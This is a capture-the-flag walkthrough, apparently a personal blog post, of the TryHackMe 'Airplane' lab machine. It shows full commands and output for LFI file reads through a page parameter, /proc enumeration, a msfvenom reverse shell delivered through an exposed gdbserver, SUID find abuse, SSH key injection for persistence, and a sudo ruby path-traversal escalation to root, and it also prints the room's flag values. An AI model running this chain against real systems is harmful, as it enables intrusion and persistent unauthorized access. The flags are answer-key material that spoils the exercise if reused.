# TryHackMe AIRPLANE 

in this room i will try to do my first black box ctf and show you the process in the way:

## 1 . RECON

*   as always i will start by doing recon so to do recon i will use nmap and try to identify what is running behind the website and the version of the services :
    

### 1.1 PORT Scan

```plaintext
nmap -sV -T4 10.82.186.120
```

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/d3cd927e-f951-42b2-93c2-b021fe3839d5.png align="center")

*   to be sure and not to misss an open port i did another advanced nmap scan :
    

```plaintext
nmap -sV -sC -p- -T4 10.82.186.120
```

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/aea39458-94d0-48c0-bddd-ff26cf459030.png align="center")

open ports :

*   22 / tcp ssh
    
*   8000/tcp http (http.server)
    
*   6048/tcp x11(uknown service)
    

I will continue tge recon specifically on port 8000:

1.  Web Server Technology (airplane.thm:8000) Service / Software: `Werkzeug httpd 3.0.2 running on Python 3.8.10.`
    

*   Server Header: Werkzeug/3.0.2 Python/3.8.10 confirms that port 8000 is running a `Python-based web application`
    

2\. Redirection & Hostname Requirements http-title: Did not follow redirect to `http://airplane.thm:8000/?page=index.html`

Key Takeaways:

Hostname Mapping (/etc/hosts): The server explicitly redirects to airplane.thm. This tells us that airplane.thm must be mapped to 10.82.162.35 in my local /etc/hosts file for the web app to load correctly in a browser.

Entry Parameter: The redirect lands directly on ?page=index.html. This instantly highlights the page query parameter as the primary entry point to test for Local File Inclusion (LFI) or Path Traversal.

what is LFI?

*   **LFI (Local File Inclusion)** is a web vulnerability that occurs when an application includes or reads files from the local server without properly sanitizing or validating user input.
    
    Instead of serving intended files (like `about.html`), the application allows an attacker to manipulate file paths and read sensitive files on the operating system.
    

but first before taking the long way lets take a look the website and also lets use gobuster if i can find a hidden directory :

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/ee9c27aa-972d-41c9-b09a-79983da19ca4.png align="center")

this is the website the ip get us :

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/26f3a0eb-c680-40ff-9083-232a7a553c54.png align="center")

there is one hidden directory called `airplane` so lets check that first

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/0af330f7-32c3-4694-873e-ae8160c48760.png align="center")

in this case there is nothing only a flothing note that says LETS FLY , so we have to go the long way and use LFI:

### 1.2 Web Enumeration & LFI Discovery

Navigating to `10.82.186.120http://:8000/` revealed a web application utilizing a URL parameter for page rendering:

```plaintext
http://10.82.186.120:8000/?page=index.html
```

so lets test and confirm if the LFI theory is right :

```plaintext
curl "http://10.82.186.120:8000/?page=../../../../etc/passwd"
```

### **Outcome**

The request successfully returned the contents of `/etc/passwd`, confirming an unsanitized **Local File Inclusion (LFI)** vulnerability.

### 1.3 Process Enumeration via `/proc`

*   Because Port 6048 returned an ambiguous service response during the Nmap scan, the Linux `/proc` virtual filesystem was targeted via LFI to identify the process bound to that port.
    

\--- On Linux systems, process command lines are stored in `/proc/[PID]/cmdline`.

*   on this step i will use a tool called ffuf to FUZZ the PIDs and to try 1 up to 1000 in this case i need a list that got 1 through 1000:
    

```plaintext
seq 1 2000 > pids.txt
```

after that lets use fuff:

```plaintext
ffuf -w pids.txt -u "http://airplane.thm:8000/?page=../../../../proc/FUZZ/cmdline" -fs 14
```

in this case i get every on services

![](https://cdn.hashnode.com/uploads/covers/6a77779d4416d3eea9accad0/5bc98084-813c-40d6-9a35-6b5ad0fbbd68.png align="center")

there are a lot of like dosens of pids so i need to specify where the 6048 is running from so i will use another command:

```python
for pid in $(cat valid_pids.txt); do 
  curl -s "http://10.82.186.120:8000/?      page=../../../../proc/$pid/cmdline" | grep "6048" && echo " Found    on PID $pid"
done
```

output:

```shell
 /usr/bin/gdbserver0.0.0.0:6048/opt/app Found on PID 527
```

**GDB Server (**`gdbserver`**)** is a lightweight program designed for remote debugging in C, C++, and other compiled languages. It allows developers to debug an application running on a target device (like an embedded system, server, or container) from a separate host machine using the standard GNU Debugger (**GDB**).

`gdbserver` is essentially a remote debugging backdoor if left exposed to the network without authentication. Because its normal job is to allow developers to inspect and manipulate processes remotely, an attacker can abuse that intended functionality to achieve **Remote Code Execution (RCE)**.

*   the next step will be to use the gdb server to get remote access
    

## 2\. **Initial Access / Exploitation**

*   The GNU Debugger (GDB) and `gdbserver` are designed specifically to work with binary executables.
    

so lets Generate an ELF shellcode payload matching the architecture of the target system (Linux x64) using `msfvenom`

```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.192.4  LPORT=4444 -f elf -o shell.elf
```

at the same time i start netcat on another tab to listen incoming signals

```shell
nc -lnvp 4444
```

the last step is to trigger the payload manually via stadard gdm command :

```python
#Launch gdb on your local machine:
gdb shell.elf
#Connect to the remote target process:
(gdb) target remote 10.82.186.120 :6048
#Upload and execute the payload on the remote host:
(gdb) remote put shell.elf /tmp/shell.elf
(gdb) set remote exec-file /tmp/shell.elf
(gdb) run
```

once the gdb excuted the netcat listener receives a reverse connection as user hudson:

```python
❯ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.82.186.120 37828
id
uid=1001(hudson) gid=1001(hudson) groups=1001(hudson)
whoami
hudson

python3 -c 'import pty; pty.spawn("/bin/bash")'
hudson@airplane:/opt$ ls -la /opt
total 24
drwxr-xr-x  3 root root 4096 May 24  2024 .
drwxr-xr-x 20 root root 4096 May 24  2024 ..
-rwxr-xr-x  1 root root 8384 May 24  2024 airplane
```

*   **Initial User Context**: The reverse shell landed as user `hudson` (`uid=1001`).
    
*   **Shell Upgrading**: Upgraded the basic `/bin/sh` shell to a fully interactive TTY using Python's `pty` module (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).
    
*   **Initial Target Inspection**: Checking `/opt` revealed the binary `/opt/airplane` which turned out to be an executable file rather than a directory.
    

**SUID Enumeration & Exploitation (**`carlos`**)**:

Enumerating SUID binaries across the host revealed that `/usr/bin/find` had custom permissions set, owned by user `carlos` rather than `root` (`-rwsr-xr-x 1 carlos carlos`).

When a binary has SUID set (`s` in the permission bit), the kernel executes the binary with the privileges of the **file owner** (`carlos`), not the person calling it (`hudson`).

```python
hudson@airplane:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/find
/usr/bin/sudo
/usr/bin/pkexec
...

hudson@airplane:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 carlos carlos 320160 Feb 18  2020 /usr/bin/find
#Executing find with the -exec flag and preserve-privileges option (-p) allowed spawning a subshell inheriting carlos's effective user ID (euid=1000):
hudson@airplane:~$ /usr/bin/find . -exec /bin/bash -p \; -quit
#The -p (preserve privileges) flag tells bash not to drop its effective user ID back to hudson, granting you an interactive shell operating as carlos.
bash-5.0$ id
uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)

bash-5.0$ cat /home/carlos/user.txt
eebfca2ca5a2b8a56c46c781aeea7562
```

so in this case we found the <mark class="bg-yellow-200 dark:bg-yellow-500/30">first flag </mark> : user.txt..`eebfca2ca5a2b8a56c46c781aeea7562`

## final stage: Privilege Escalation

in this case lets upgrade to clean tty shell as carlos:

Right now, i am running in a subshell spawned by `find`. For a smoother workflow, SSH directly into the machine as `carlos` using the SSH key i will injected into `/home/carlos/.ssh/authorized_keys`,

Step 1: Key Injection & Permissions (On the Target Machine)

```shell
 # Executed on the target server via the existing shell
mkdir -p /home/carlos/.ssh
chmod 700 /home/carlos/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOUODd65PArq3GYK2J88yTGa7c5AWn+jrO9lu+Jl+9q8 abrham@archlinux" > /home/carlos/.ssh/authorized_keys
chmod 600 /home/carlos/.ssh/authorized_keys
```

Step 2: Establishing the Direct SSH Connection

Finally, show the command run from my local terminal to establish the persistent interactive shell:

```shell
❯ ssh carlos@10.82.186.120
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-139-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Your Hardware Enablement Stack (HWE) is supported until April 2025.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

carlos@airplane:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
carlos@airplane:~$ cat user.txt
eebfca2ca5a2b8a56c46c781aeea7562
carlos@airplane:~$ nano cat
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

step 3: Privilege Escalation to Root

After establishing access as `carlos`, inspecting user privileges with `sudo -l` revealed a permissive `NOPASSWD` entry for the Ruby interpreter:

```shell
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```

#### Vulnerability Analysis

*   The configuration permits `carlos` to execute any Ruby script residing in `/root/` with `root` permissions. However, because the rule uses a wildcard (`*.rb`) without enforcing canonical path checks, it is vulnerable to **Directory Traversal** (`../`).
    

Exploitation & Shell Access

*   Created a malicious Ruby script in the world-writable `/tmp` directory containing a shell execution instruction:
    
*   **How It Works**: The command tells the Ruby interpreter to run `exec "/bin/bash"`, which replaces the running Ruby process with an interactive Bash shell.
    

```shell
echo 'exec "/bin/bash"' > /tmp/shell.rb
```

*   Invoked `sudo` using a relative path to satisfy the `/root/*.rb` pattern requirement while executing our `/tmp/shell.rb` file:
    

```shell
sudo /usr/bin/ruby /root/../tmp/shell.rb
```

```shell
carlos@airplane:~$ echo 'exec "/bin/bash"' > /tmp/shell.rb
carlos@airplane:~$ sudo /usr/bin/ruby /root/../tmp/shell.rb
root@airplane:/home/carlos# ls
cat  Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
root@airplane:/home/carlos# cat /root/root.txt
190dcbeb688ce5fe029f26a1e5fce002
```

finally i found the second flag: <mark class="bg-yellow-200 dark:bg-yellow-500/30">root.txt </mark> `190dcbeb688ce5fe029f26a1e5fce002`

> Thank you for reading!